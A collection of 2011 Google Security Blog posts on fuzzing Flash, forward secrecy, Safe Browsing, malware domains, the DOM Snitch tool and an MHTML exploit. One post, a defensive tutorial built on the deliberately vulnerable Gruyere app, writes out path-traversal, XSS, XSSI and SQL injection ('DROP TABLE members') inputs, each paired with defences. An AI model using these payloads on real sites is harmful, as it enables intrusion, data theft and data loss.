{"website": "Google-Security", "title": "\nFuzzing at scale\n", "author": ["Posted by Chris Evans, Matt Moore and Tavis Ormandy, Google Security Team"], "link": "https://security.googleblog.com/2011/08/fuzzing-at-scale.html", "abstract": "                             Posted by Chris Evans, Matt Moore and Tavis Ormandy, Google Security Team \r \r One of the exciting things about working on security at Google is that you have a lot of compute horsepower available if you need it. This is very useful if you&#8217;re looking to  fuzz  something, and especially if you&#8217;re going to use modern fuzzing techniques.\r \r Using these techniques and large amounts of compute power, we&#8217;ve found hundreds of bugs in our own code, including Chrome components such as WebKit and the PDF viewer. We recently decided to apply the same techniques to fuzz Adobe&#8217;s Flash Player, which we include with Chrome in partnership with Adobe.\r \r A good overview of some modern techniques can be read  in this presentation . For the purposes of fuzzing Flash, we mainly relied on &#8220;corpus distillation&#8221;. This is a technique whereby you locate a large number of sample files for the format at hand (SWF in this case). You then see which areas of code are reached by each of the sample files. Finally, you run an algorithm to generate a minimal set of sample files that achieves the code coverage of the full set. This calculated set of files is a great basis for fuzzing: a manageable number of files that exercise lots of unusual code paths.\r \r What does corpus distillation look like at Google scale? Turns out we have a large index of the web, so we cranked through 20 terabytes of SWF file downloads followed by 1 week of run time on 2,000 CPU cores to calculate the minimal set of about 20,000 files. Finally, those same 2,000 cores plus 3 more weeks of runtime were put to good work mutating the files in the minimal set (bitflipping, etc.) and generating crash cases. These crash cases included an interesting range of vulnerability categories, including buffer overflows, integer overflows, use-after-frees and object type confusions.\r \r The initial run of the ongoing effort resulted in about 400 unique crash signatures, which were logged as 106 individual security bugs following Adobe's initial triage. As these bugs were resolved, many were identified as duplicates that weren't caught during the initial triage. A unique crash signature does not always indicate a unique bug. Since Adobe has access to symbols and sources, they were able to group similar crashes to perform root cause analysis reducing the actual number of changes to the code. No analysis was performed to determine how many of the identified crashes were actually exploitable. However, each crash was treated as though it were potentially exploitable and addressed by Adobe. In the final analysis, the Flash Player update Adobe shipped earlier this week contained about 80 code changes to fix these bugs.\r \r Commandeering massive resource to improve security is rewarding on its own, but the real highlight of this exercise has been Adobe&#8217;s response. The  Flash patch  earlier this week fixes these bugs and incorporates UIPI protections for the Flash Player sandbox in Chrome which Justin Schuh contributed assistance on developing. Fixing  so many issues  in such a short time frame shows a real commitment to security from Adobe, for which we are grateful.                                   Posted by Chris Evans, Matt Moore and Tavis Ormandy, Google Security Team\r\rOne of the exciting things about working on security at Google is that you have a lot of compute horsepower available if you need it. This is very useful if you’re looking to fuzz something, and especially if you’re going to use modern fuzzing techniques.\r\rUsing these techniques and large amounts of compute power, we’ve found hundreds of bugs in our own code, including Chrome components such as WebKit and the PDF viewer. We recently decided to apply the same techniques to fuzz Adobe’s Flash Player, which we include with Chrome in partnership with Adobe.\r\rA good overview of some modern techniques can be read in this presentation. For the purposes of fuzzing Flash, we mainly relied on “corpus distillation”. This is a technique whereby you locate a large number of sample files for the format at hand (SWF in this case). You then see which areas of code are reached by each of the sample files. Finally, you run an algorithm to generate a minimal set of sample files that achieves the code coverage of the full set. This calculated set of files is a great basis for fuzzing: a manageable number of files that exercise lots of unusual code paths.\r\rWhat does corpus distillation look like at Google scale? Turns out we have a large index of the web, so we cranked through 20 terabytes of SWF file downloads followed by 1 week of run time on 2,000 CPU cores to calculate the minimal set of about 20,000 files. Finally, those same 2,000 cores plus 3 more weeks of runtime were put to good work mutating the files in the minimal set (bitflipping, etc.) and generating crash cases. These crash cases included an interesting range of vulnerability categories, including buffer overflows, integer overflows, use-after-frees and object type confusions.\r\rThe initial run of the ongoing effort resulted in about 400 unique crash signatures, which were logged as 106 individual security bugs following Adobe's initial triage. As these bugs were resolved, many were identified as duplicates that weren't caught during the initial triage. A unique crash signature does not always indicate a unique bug. Since Adobe has access to symbols and sources, they were able to group similar crashes to perform root cause analysis reducing the actual number of changes to the code. No analysis was performed to determine how many of the identified crashes were actually exploitable. However, each crash was treated as though it were potentially exploitable and addressed by Adobe. In the final analysis, the Flash Player update Adobe shipped earlier this week contained about 80 code changes to fix these bugs.\r\rCommandeering massive resource to improve security is rewarding on its own, but the real highlight of this exercise has been Adobe’s response. The Flash patch earlier this week fixes these bugs and incorporates UIPI protections for the Flash Player sandbox in Chrome which Justin Schuh contributed assistance on developing. Fixing so many issues in such a short time frame shows a real commitment to security from Adobe, for which we are grateful.     ", "date": "August 12, 2011"},
{"website": "Google-Security", "title": "\nProtecting data for the long term with forward secrecy\n", "author": ["Posted by Adam Langley, Security Team"], "link": "https://security.googleblog.com/2011/11/protecting-data-for-long-term-with.html", "abstract": "                             Posted by Adam Langley, Security Team   Last year we introduced  HTTPS by default for Gmail  and  encrypted search . We&#8217;re pleased to see that other major communications sites are following suit and deploying HTTPS in one form or another. We are now pushing forward by enabling  forward secrecy  by default.  Most major sites supporting HTTPS operate in a non-forward secret fashion, which runs the risk of retrospective decryption. In other words, an encrypted, unreadable email could be recorded while being delivered to your computer today. In ten years time, when computers are much faster, an adversary could break the server private key and retrospectively decrypt today&#8217;s email traffic.  Forward secrecy requires that the private keys for a connection are not kept in persistent storage. An adversary that breaks a single key will no longer be able to decrypt months&#8217; worth of connections; in fact, not even the server operator will be able to retroactively decrypt HTTPS sessions.  Forward secret HTTPS is now live for Gmail and many other Google HTTPS services(*), like SSL Search, Docs and Google+. We have also  released the work  that we did on the open source OpenSSL library that made this possible. You can check whether you have forward secret connections in Chrome by clicking on the green padlock in the address bar of HTTPS sites. Google&#8217;s forward secret connections will have a key exchange mechanism of ECDHE_RSA.  We would very much like to see forward secrecy become the norm and hope that our deployment serves as a demonstration of the practicality of that vision.    (* Chrome, Firefox (all platforms) and Internet Explorer (Vista or later) support forward secrecy using elliptic curve Diffie-Hellman. Initially, only Chrome and Firefox will use it by default with Google services because IE doesn&#8217;t support the combination of ECDHE and RC4. We hope to support IE in the future.)                                   Posted by Adam Langley, Security TeamLast year we introduced HTTPS by default for Gmail and encrypted search. We’re pleased to see that other major communications sites are following suit and deploying HTTPS in one form or another. We are now pushing forward by enabling forward secrecy by default.Most major sites supporting HTTPS operate in a non-forward secret fashion, which runs the risk of retrospective decryption. In other words, an encrypted, unreadable email could be recorded while being delivered to your computer today. In ten years time, when computers are much faster, an adversary could break the server private key and retrospectively decrypt today’s email traffic.Forward secrecy requires that the private keys for a connection are not kept in persistent storage. An adversary that breaks a single key will no longer be able to decrypt months’ worth of connections; in fact, not even the server operator will be able to retroactively decrypt HTTPS sessions.Forward secret HTTPS is now live for Gmail and many other Google HTTPS services(*), like SSL Search, Docs and Google+. We have also released the work that we did on the open source OpenSSL library that made this possible. You can check whether you have forward secret connections in Chrome by clicking on the green padlock in the address bar of HTTPS sites. Google’s forward secret connections will have a key exchange mechanism of ECDHE_RSA.We would very much like to see forward secrecy become the norm and hope that our deployment serves as a demonstration of the practicality of that vision.(* Chrome, Firefox (all platforms) and Internet Explorer (Vista or later) support forward secrecy using elliptic curve Diffie-Hellman. Initially, only Chrome and Firefox will use it by default with Google services because IE doesn’t support the combination of ECDHE and RC4. We hope to support IE in the future.)     ", "date": "November 22, 2011"},
{"website": "Google-Security", "title": "\nWebsite Security for Webmasters\n", "author": ["Posted by Gary Illyes, Webmaster Trends Analyst"], "link": "https://security.googleblog.com/2011/05/website-security-for-webmasters.html", "abstract": "                             Posted by Gary Illyes, Webmaster Trends Analyst     (Cross-posted from the  Webmaster Central Blog )    Users are taught to protect themselves from malicious programs by installing sophisticated antivirus software, but they often also entrust their private information to various websites. As a result, webmasters have a dual task to protect both their website itself and the user data that they receive.  Over the years companies and webmasters have learned&#8212;often the hard way&#8212;that web application security is not a joke; we&#8217;ve seen user passwords leaked due to  SQL injection  attacks, cookies stolen with  XSS , and websites taken over by hackers due to negligent input validation.   Today we&#8217;ll show you some examples of how a web application can be exploited so you can learn from them; for this we&#8217;ll use  Gruyere , an intentionally vulnerable application we use for security training internally, and that we introduced here  last year .  Do not probe others&#8217; websites for vulnerabilities without permission  as it may be perceived as hacking; but you&#8217;re welcome&#8212;nay, encouraged&#8212;to run tests on Gruyere.     Client state manipulation - What will happen if I alter the URL?   Let&#8217;s say you have an image hosting site and you&#8217;re using a PHP script to display the images users have uploaded:   http://www.example.com/showimage.php?imgloc=/garyillyes/kitten.jpg   So what will the application do if I alter the URL to something like this and userpasswords.txt is an actual file?   http://www.example.com/showimage.php?imgloc=/../../userpasswords.txt   Will I get the content of userpasswords.txt?  Another example of client state manipulation is when form fields are not validated. For instance, let&#8217;s say you have this form:       It seems that the username of the submitter is stored in a hidden input field. Well, that&#8217;s great! Does that mean that if I change the value of that field to another username, I can submit the form as that user? It may very well happen; the user input is apparently not authenticated with, for example, a token which can be verified on the server. Imagine the situation if that form were part of your shopping cart and I modified the price of a $1000 item to $1, and then placed the order.  Protecting your application against this kind of attack is not easy; take a look at the third part of  Gruyere  to learn a few tips about how to defend your app.   Cross-site scripting (XSS) - User input can&#8217;t be trusted        A simple, harmless URL:  http://google-gruyere.appspot.com/611788451095/%3Cscript%3Ealert('0wn3d')%3C/script%3E  But is it truly harmless? If I decode the  percent-encoded  characters, I get:  &lt;script&gt;alert('0wn3d')&lt;/script&gt;  Gruyere, just like many sites with  custom error pages , is designed to include the path component in the HTML page. This can introduce security bugs, like XSS, as it introduces user input directly into the rendered HTML page of the web application. You might say, &#8220;It&#8217;s just an alert box, so what?&#8221; The thing is, if I can inject an alert box, I can most likely inject something else, too, and maybe steal your cookies which I could use to sign in to your site as you.  Another example is when the stored user input isn&#8217;t sanitized. Let&#8217;s say I write a comment on your blog; the comment is simple:  &lt;a href=&#8221;javascript:alert(&#8216;0wn3d&#8217;)&#8221;&gt;Click here to see a kitten&lt;/a&gt;  If other users click on my innocent link, I have their cookies:       You can learn how to find XSS vulnerabilities in your own web app and how to fix them in the second part of  Gruyere ; or, if you&#8217;re an advanced developer, take a look at the automatic escaping features in template systems we blogged about previously on  this blog .   Cross-site request forgery (XSRF) - Should I trust requests from evil.com?       Oops, a broken picture. It can&#8217;t be dangerous--it&#8217;s broken, after all--which means that the URL of the image returns a 404 or it&#8217;s just malformed. Is that true in all of the cases?  No, it&#8217;s not! You can specify any URL as an image source, regardless of its content type. It can be an HTML page, a JavaScript file, or some other potentially malicious resource. In this case the image source was a simple page&#8217;s URL:       That page will only work if I&#8217;m logged in and I have some cookies set. Since I was actually logged in to the application, when the browser tried to fetch the image by accessing the image source URL, it also deleted my first snippet. This doesn&#8217;t sound particularly dangerous, but if I&#8217;m a bit familiar with the app, I could also invoke a URL which deletes a user&#8217;s profile or lets admins grant permissions for other users.  To protect your app against XSRF you should not allow state changing actions to be called via GET; the POST method was invented for this kind of state-changing request. This change alone may have mitigated the above attack, but usually it's not enough and you need to include an unpredictable value in all state changing requests to prevent XSRF. Please head to  Gruyere  if you want to learn more about XSRF.   Cross-site script inclusion (XSSI) - All your script are belong to us   Many sites today can dynamically update a page's content via asynchronous JavaScript  requests that return JSON data. Sometimes, JSON can contain sensitive data, and if the correct precautions are not in place, it may be possible for an attacker to steal this sensitive information.  Let&#8217;s imagine the following scenario: I have created a standard HTML page and send you the link; since you trust me, you visit the link I sent you. The page contains only a few lines:  &lt;script&gt;function _feed(s) {alert(\"Your private snippet is: \" + s['private_snippet']);}&lt;/script&gt;&lt;script src=\"http://google-gruyere.appspot.com/611788451095/feed.gtl\"&gt;&lt;/script&gt;  Since you&#8217;re signed in to Gruyere and you have a private snippet, you&#8217;ll see an alert box on my page informing you about the contents of your snippet. As always, if I managed to fire up an alert box, I can do whatever else I want; in this case it was a simple snippet, but it could have been your biggest secret, too.  It&#8217;s not too hard to defend your app against XSSI, but it still requires careful thinking. You can use tokens as explained in the XSRF section, set your script to answer only POST requests, or simply start the JSON response with &#8216;\\n&#8217; to make sure the script is not executable.   SQL Injection - Still think user input is safe?   What will happen if I try to sign in to your app with a username like  JohnDoe&#8217;; DROP TABLE members;--  While this specific example won&#8217;t expose user data, it can cause great headaches because it has the potential to completely remove the SQL table where your app stores information about members.  Generally, you can protect your app from SQL injection with proactive thinking and input validation. First, are you sure the SQL user needs to have permission to execute &#8220;DROP TABLE members&#8221;? Wouldn&#8217;t it be enough to grant only SELECT rights? By setting the SQL user&#8217;s permissions carefully, you can avoid painful experiences and lots of troubles. You might also want to configure error reporting in such way that the database and its tables&#8217; names aren&#8217;t exposed in the case of a failed query. Second, as we learned in the XSS case, never trust user input: what looks like a login form to you, looks like a potential doorway to an attacker. Always sanitize and quotesafe the input that will be stored in a database, and whenever possible make use of statements generally referred to as prepared or parametrized statements available in most database programming interfaces.  Knowing how web applications can be exploited is the first step in understanding how to defend them. In light of this, we encourage you to take the  Gruyere course , take other web security courses from the  Google Code University  and check out  skipfish  if you're looking for an automated web application security testing tool. If you have more questions please post them in our  Webmaster Help Forum .                                     Posted by Gary Illyes, Webmaster Trends Analyst(Cross-posted from the Webmaster Central Blog)Users are taught to protect themselves from malicious programs by installing sophisticated antivirus software, but they often also entrust their private information to various websites. As a result, webmasters have a dual task to protect both their website itself and the user data that they receive.Over the years companies and webmasters have learned—often the hard way—that web application security is not a joke; we’ve seen user passwords leaked due to SQL injection attacks, cookies stolen with XSS, and websites taken over by hackers due to negligent input validation.Today we’ll show you some examples of how a web application can be exploited so you can learn from them; for this we’ll use Gruyere, an intentionally vulnerable application we use for security training internally, and that we introduced here last year. Do not probe others’ websites for vulnerabilities without permission as it may be perceived as hacking; but you’re welcome—nay, encouraged—to run tests on Gruyere.Client state manipulation - What will happen if I alter the URL?Let’s say you have an image hosting site and you’re using a PHP script to display the images users have uploaded:http://www.example.com/showimage.php?imgloc=/garyillyes/kitten.jpgSo what will the application do if I alter the URL to something like this and userpasswords.txt is an actual file?http://www.example.com/showimage.php?imgloc=/../../userpasswords.txtWill I get the content of userpasswords.txt?Another example of client state manipulation is when form fields are not validated. For instance, let’s say you have this form:It seems that the username of the submitter is stored in a hidden input field. Well, that’s great! Does that mean that if I change the value of that field to another username, I can submit the form as that user? It may very well happen; the user input is apparently not authenticated with, for example, a token which can be verified on the server.Imagine the situation if that form were part of your shopping cart and I modified the price of a $1000 item to $1, and then placed the order.Protecting your application against this kind of attack is not easy; take a look at the third part of Gruyere to learn a few tips about how to defend your app.Cross-site scripting (XSS) - User input can’t be trustedA simple, harmless URL:http://google-gruyere.appspot.com/611788451095/%3Cscript%3Ealert('0wn3d')%3C/script%3EBut is it truly harmless? If I decode the percent-encoded characters, I get: alert('0wn3d') Gruyere, just like many sites with custom error pages, is designed to include the path component in the HTML page. This can introduce security bugs, like XSS, as it introduces user input directly into the rendered HTML page of the web application. You might say, “It’s just an alert box, so what?” The thing is, if I can inject an alert box, I can most likely inject something else, too, and maybe steal your cookies which I could use to sign in to your site as you.Another example is when the stored user input isn’t sanitized. Let’s say I write a comment on your blog; the comment is simple: Click here to see a kitten If other users click on my innocent link, I have their cookies:You can learn how to find XSS vulnerabilities in your own web app and how to fix them in the second part of Gruyere; or, if you’re an advanced developer, take a look at the automatic escaping features in template systems we blogged about previously on this blog.Cross-site request forgery (XSRF) - Should I trust requests from evil.com? Oops, a broken picture. It can’t be dangerous--it’s broken, after all--which means that the URL of the image returns a 404 or it’s just malformed. Is that true in all of the cases?No, it’s not! You can specify any URL as an image source, regardless of its content type. It can be an HTML page, a JavaScript file, or some other potentially malicious resource. In this case the image source was a simple page’s URL:That page will only work if I’m logged in and I have some cookies set. Since I was actually logged in to the application, when the browser tried to fetch the image by accessing the image source URL, it also deleted my first snippet. This doesn’t sound particularly dangerous, but if I’m a bit familiar with the app, I could also invoke a URL which deletes a user’s profile or lets admins grant permissions for other users.To protect your app against XSRF you should not allow state changing actions to be called via GET; the POST method was invented for this kind of state-changing request. This change alone may have mitigated the above attack, but usually it's not enough and you need to include an unpredictable value in all state changing requests to prevent XSRF. Please head to Gruyere if you want to learn more about XSRF.Cross-site script inclusion (XSSI) - All your script are belong to usMany sites today can dynamically update a page's content via asynchronous JavaScript  requests that return JSON data. Sometimes, JSON can contain sensitive data, and if the correct precautions are not in place, it may be possible for an attacker to steal this sensitive information.Let’s imagine the following scenario: I have created a standard HTML page and send you the link; since you trust me, you visit the link I sent you. The page contains only a few lines: function _feed(s) {alert(\"Your private snippet is: \" + s['private_snippet']);}   Since you’re signed in to Gruyere and you have a private snippet, you’ll see an alert box on my page informing you about the contents of your snippet. As always, if I managed to fire up an alert box, I can do whatever else I want; in this case it was a simple snippet, but it could have been your biggest secret, too.It’s not too hard to defend your app against XSSI, but it still requires careful thinking. You can use tokens as explained in the XSRF section, set your script to answer only POST requests, or simply start the JSON response with ‘\\n’ to make sure the script is not executable.SQL Injection - Still think user input is safe?What will happen if I try to sign in to your app with a username likeJohnDoe’; DROP TABLE members;--While this specific example won’t expose user data, it can cause great headaches because it has the potential to completely remove the SQL table where your app stores information about members.Generally, you can protect your app from SQL injection with proactive thinking and input validation. First, are you sure the SQL user needs to have permission to execute “DROP TABLE members”? Wouldn’t it be enough to grant only SELECT rights? By setting the SQL user’s permissions carefully, you can avoid painful experiences and lots of troubles. You might also want to configure error reporting in such way that the database and its tables’ names aren’t exposed in the case of a failed query.Second, as we learned in the XSS case, never trust user input: what looks like a login form to you, looks like a potential doorway to an attacker. Always sanitize and quotesafe the input that will be stored in a database, and whenever possible make use of statements generally referred to as prepared or parametrized statements available in most database programming interfaces.Knowing how web applications can be exploited is the first step in understanding how to defend them. In light of this, we encourage you to take the Gruyere course, take other web security courses from the Google Code University and check out skipfish if you're looking for an automated web application security testing tool. If you have more questions please post them in our Webmaster Help Forum.     ", "date": "May 5, 2011"},
{"website": "Google-Security", "title": "\nSafe Browsing Protocol v2 Transition\n", "author": ["Posted by Ian Fette, Google Security Team"], "link": "https://security.googleblog.com/2011/05/safe-browsing-protocol-v2-transition.html", "abstract": "                             Posted by Ian Fette, Google Security Team   Last year, we released  version 2  of the Safe Browsing API, along with a  reference implementation  in Python. This version provides more efficient updates compared to version 1, giving clients the most useful (freshest) data first. The new version uses significantly less bandwidth, and also allows us to serve data that covers more URLs than previously possible. Browsers including Chrome and Firefox have already migrated to version 2, and we are confident that the new version works well and delivers significant benefits compared to the previous version.  We are now planning to discontinue version 1 of the protocol to help us better focus our efforts and resources. On December 1, 2011, we will stop supporting version 1 and will take the service down shortly thereafter. If you are currently using version 1 of the protocol, we encourage you to migrate as soon as possible to the new version. In addition to the  documentation  and  reference implementation , there&#8217;s a  Google Group  dedicated to the API where you may be able to get additional advice or ask questions as you prepare to transition. Those of you who who have already migrated to version 2 will not be affected and do not need to take any further action.  If you are looking to migrate from the version 1 API and are worried about the complexity of the version 2 API, we now have a  lookup service  that you can use in lieu of version 2 of the Safe Browsing Protocol if your usage is relatively low. The lookup service is a RESTful service that lets you send a URL or set of URLs to Google and receive a reply indicating the state of those URLs. You can use this API  if you check fewer than 100,000 URLs per day and don&#8217;t mind waiting on a network roundtrip. This process may be simpler to use than version 2 of the Safe Browsing Protocol, but it is not supported for users who will generate excessive load (meaning that your software, either your servers or deployed clients, will collectively generate over 100,000 requests to Google in a 24-hour period).  If you are currently using version 1 of the Safe Browsing Protocol, please update to either the Safe Browsing Protocol version 2, or the lookup service, before December 1, 2011. If you have any questions, feel free to check out the Google Safe Browsing API  discussion list .                                   Posted by Ian Fette, Google Security TeamLast year, we released version 2 of the Safe Browsing API, along with a reference implementation in Python. This version provides more efficient updates compared to version 1, giving clients the most useful (freshest) data first. The new version uses significantly less bandwidth, and also allows us to serve data that covers more URLs than previously possible. Browsers including Chrome and Firefox have already migrated to version 2, and we are confident that the new version works well and delivers significant benefits compared to the previous version.We are now planning to discontinue version 1 of the protocol to help us better focus our efforts and resources. On December 1, 2011, we will stop supporting version 1 and will take the service down shortly thereafter. If you are currently using version 1 of the protocol, we encourage you to migrate as soon as possible to the new version. In addition to the documentation and reference implementation, there’s a Google Group dedicated to the API where you may be able to get additional advice or ask questions as you prepare to transition. Those of you who who have already migrated to version 2 will not be affected and do not need to take any further action.If you are looking to migrate from the version 1 API and are worried about the complexity of the version 2 API, we now have a lookup service that you can use in lieu of version 2 of the Safe Browsing Protocol if your usage is relatively low. The lookup service is a RESTful service that lets you send a URL or set of URLs to Google and receive a reply indicating the state of those URLs. You can use this API  if you check fewer than 100,000 URLs per day and don’t mind waiting on a network roundtrip. This process may be simpler to use than version 2 of the Safe Browsing Protocol, but it is not supported for users who will generate excessive load (meaning that your software, either your servers or deployed clients, will collectively generate over 100,000 requests to Google in a 24-hour period).If you are currently using version 1 of the Safe Browsing Protocol, please update to either the Safe Browsing Protocol version 2, or the lookup service, before December 1, 2011. If you have any questions, feel free to check out the Google Safe Browsing API discussion list.     ", "date": "May 26, 2011"},
{"website": "Google-Security", "title": "\nProtecting users from malware hosted on bulk subdomain services\n", "author": ["Posted by Oliver Fisher, Google Anti-Malware Team"], "link": "https://security.googleblog.com/2011/06/protecting-users-from-malware-hosted-on.html", "abstract": "                             Posted by Oliver Fisher, Google Anti-Malware Team   Over the past few months, Google&#8217;s systems have detected a number of bulk subdomain providers becoming targets of abuse by malware distributors. Bulk subdomain providers register a domain name, like example.com, and then sell subdomains of this domain name, like subdomain.example.com. Subdomains are often registered by the thousands at one time and are used to distribute malware and fake anti-virus products on the web. In some cases our malware scanners have found more than 50,000 malware domains from a single bulk provider.  Google&#8217;s automated malware scanning systems detect sites that distribute malware. To help protect users we recently modified those systems to identify bulk subdomain services which are being abused. In some severe cases our systems may now flag the whole bulk domain.  We offer many services to webmasters to help them fight abuse, such as:    Webmaster Tools  lets webmasters find examples of URLs under their domains that may be distributing malware.   Google Safe Browsing Alerts for Network Administrators  allows owners of Autonomous Systems to get notifications for hosts that are involved in malware delivery.   If you are the owner of a website that is hosted in a bulk subdomain service, please consider contacting your bulk subdomain provider if Google SafeBrowsing shows a warning for your site. The top-level bulk subdomain may be a target of abuse. Bulk subdomain service providers may use Google&#8217;s tools to help identify and disable abusive subdomains and accounts.                                   Posted by Oliver Fisher, Google Anti-Malware TeamOver the past few months, Google’s systems have detected a number of bulk subdomain providers becoming targets of abuse by malware distributors. Bulk subdomain providers register a domain name, like example.com, and then sell subdomains of this domain name, like subdomain.example.com. Subdomains are often registered by the thousands at one time and are used to distribute malware and fake anti-virus products on the web. In some cases our malware scanners have found more than 50,000 malware domains from a single bulk provider.Google’s automated malware scanning systems detect sites that distribute malware. To help protect users we recently modified those systems to identify bulk subdomain services which are being abused. In some severe cases our systems may now flag the whole bulk domain.We offer many services to webmasters to help them fight abuse, such as:Webmaster Tools lets webmasters find examples of URLs under their domains that may be distributing malware.Google Safe Browsing Alerts for Network Administrators allows owners of Autonomous Systems to get notifications for hosts that are involved in malware delivery. If you are the owner of a website that is hosted in a bulk subdomain service, please consider contacting your bulk subdomain provider if Google SafeBrowsing shows a warning for your site. The top-level bulk subdomain may be a target of abuse. Bulk subdomain service providers may use Google’s tools to help identify and disable abusive subdomains and accounts.     ", "date": "June 17, 2011"},
{"website": "Google-Security", "title": "\nExpanding Safe Browsing Alerts to include malware distribution domains\n", "author": ["Posted by Nav Jagpal, Security Team"], "link": "https://security.googleblog.com/2011/12/expanding-safe-browsing-alerts-to.html", "abstract": "                             Posted by Nav Jagpal, Security Team   For the past year, we&#8217;ve been sending notifications to network administrators registered through the  Safe Browsing Alerts for Network Administrators  service when our automated tools find phishing URLs or compromised sites that lead to malware on their networks. These notifications provide administrators with important information to help them improve the security of their networks.  Today we&#8217;re adding distribution domains to the set of information we share. These are domains that are responsible for launching exploits and serving malware. Unlike compromised sites, which are often run by innocent webmasters, distribution domains are set up with the primary purpose of serving malicious content.  If you&#8217;re a network administrator and haven&#8217;t yet registered your AS, you can do so  here .                                   Posted by Nav Jagpal, Security TeamFor the past year, we’ve been sending notifications to network administrators registered through the Safe Browsing Alerts for Network Administrators service when our automated tools find phishing URLs or compromised sites that lead to malware on their networks. These notifications provide administrators with important information to help them improve the security of their networks.Today we’re adding distribution domains to the set of information we share. These are domains that are responsible for launching exploits and serving malware. Unlike compromised sites, which are often run by innocent webmasters, distribution domains are set up with the primary purpose of serving malicious content.If you’re a network administrator and haven’t yet registered your AS, you can do so here.     ", "date": "December 1, 2011"},
{"website": "Google-Security", "title": "\nIntroducing DOM Snitch, our passive in-the-browser reconnaissance tool\n", "author": [], "link": "https://security.googleblog.com/2011/06/introducing-dom-snitch-our-passive-in.html", "abstract": "                             Posted by Radoslav Vasilev, Security Test Engineer      (Cross-posted from the  Google Testing Blog )   Every day modern web applications are becoming increasingly sophisticated, and as their complexity grows so does their attack surface. Previously we introduced open source tools such as  Skipfish  and  Ratproxy  to assist developers in understanding and securing these applications.  As existing tools focus mostly on testingserver-side code, today we are happy to introduce  DOM Snitch  &#8212; an experimental* Chrome extension that enables developers and testers to identify insecure practices commonly found in client-side code. To do this, we have adopted  several approaches  to intercepting JavaScript calls to key and potentially dangerous browser infrastructure such as document.write or HTMLElement.innerHTML ( among others ). Once a JavaScript call has been intercepted, DOM Snitch records the document URL and a complete stack trace that will help assess if the intercepted call can lead to cross-site scripting, mixed content, insecure modifications to the  same-origin policy for DOM access , or other client-side issues.       Here are the benefits of DOM Snitch:    Real-time:  Developers can observe DOM modifications as they happen inside the browser without the need to step through JavaScript code with a debugger or pause the execution of their application.   Easy to use:  With built-in  security heuristics  and nested views, both advanced and less experienced developers and testers can quickly spot areas of the application being tested that need more attention.   Easier collaboration:  Enables developers to easily export and share captured DOM modifications while troubleshooting an issue with their peers.  DOM Snitch is intended for use by developers, testers, and security researchers alike.  Click here  to download DOM Snitch. To read the documentation, please visit  this page .   *Developers and testers should be aware that DOM Snitch is currently experimental. We do not guarantee that it will work flawlessly for all web applications. More details on known issues can be found  here  or in the project&#8217;s  issues tracker .                                    Posted by Radoslav Vasilev, Security Test Engineer(Cross-posted from the Google Testing Blog)Every day modern web applications are becoming increasingly sophisticated, and as their complexity grows so does their attack surface. Previously we introduced open source tools such as Skipfish and Ratproxy to assist developers in understanding and securing these applications.As existing tools focus mostly on testingserver-side code, today we are happy to introduce DOM Snitch — an experimental* Chrome extension that enables developers and testers to identify insecure practices commonly found in client-side code. To do this, we have adopted several approaches to intercepting JavaScript calls to key and potentially dangerous browser infrastructure such as document.write or HTMLElement.innerHTML (among others). Once a JavaScript call has been intercepted, DOM Snitch records the document URL and a complete stack trace that will help assess if the intercepted call can lead to cross-site scripting, mixed content, insecure modifications to the same-origin policy for DOM access, or other client-side issues.Here are the benefits of DOM Snitch:Real-time: Developers can observe DOM modifications as they happen inside the browser without the need to step through JavaScript code with a debugger or pause the execution of their application.Easy to use: With built-in security heuristics and nested views, both advanced and less experienced developers and testers can quickly spot areas of the application being tested that need more attention.Easier collaboration: Enables developers to easily export and share captured DOM modifications while troubleshooting an issue with their peers.DOM Snitch is intended for use by developers, testers, and security researchers alike. Click here to download DOM Snitch. To read the documentation, please visit this page.*Developers and testers should be aware that DOM Snitch is currently experimental. We do not guarantee that it will work flawlessly for all web applications. More details on known issues can be found here or in the project’s issues tracker.     ", "date": "June 21, 2011"},
{"website": "Google-Security", "title": "\nMHTML vulnerability under active exploitation\n", "author": ["Posted by Chris Evans, Robert Swiecki, Michal Zalewski, and Billy Rios, Google Security Team"], "link": "https://security.googleblog.com/2011/03/mhtml-vulnerability-under-active.html", "abstract": "                             Posted by Chris Evans, Robert Swiecki, Michal Zalewski, and Billy Rios, Google Security Team     We&#8217;ve noticed some highly targeted and apparently politically motivated attacks against our users. We believe activists may have been a specific target. We&#8217;ve also seen attacks against users of another popular social site. All these attacks abuse a publicly-disclosed  MHTML vulnerability  for which an exploit was publicly posted in January 2011. Users browsing with the Internet Explorer browser are affected.    For now, we recommend concerned users and corporations seriously consider  deploying Microsoft&#8217;s temporary Fixit  to block this attack until an official patch is available.    To help protect users of our services, we have deployed various server-side defenses to make the MHTML vulnerability harder to exploit. That said, these are not tenable long-term solutions, and we can&#8217;t guarantee them to be 100% reliable or comprehensive.  We&#8217;re working with Microsoft to develop a comprehensive solution for this issue.    The abuse of this vulnerability is also interesting because it represents a new quality in the exploitation of web-level vulnerabilities. To date, similar attacks focused on directly compromising users' systems, as opposed to leveraging vulnerabilities to interact with web  services.                                   Posted by Chris Evans, Robert Swiecki, Michal Zalewski, and Billy Rios, Google Security Team  We’ve noticed some highly targeted and apparently politically motivated attacks against our users. We believe activists may have been a specific target. We’ve also seen attacks against users of another popular social site. All these attacks abuse a publicly-disclosed MHTML vulnerability for which an exploit was publicly posted in January 2011. Users browsing with the Internet Explorer browser are affected.  For now, we recommend concerned users and corporations seriously consider deploying Microsoft’s temporary Fixit to block this attack until an official patch is available.  To help protect users of our services, we have deployed various server-side defenses to make the MHTML vulnerability harder to exploit. That said, these are not tenable long-term solutions, and we can’t guarantee them to be 100% reliable or comprehensive.  We’re working with Microsoft to develop a comprehensive solution for this issue.  The abuse of this vulnerability is also interesting because it represents a new quality in the exploitation of web-level vulnerabilities. To date, similar attacks focused on directly compromising users' systems, as opposed to leveraging vulnerabilities to interact with web services.     ", "date": "March 11, 2011"},
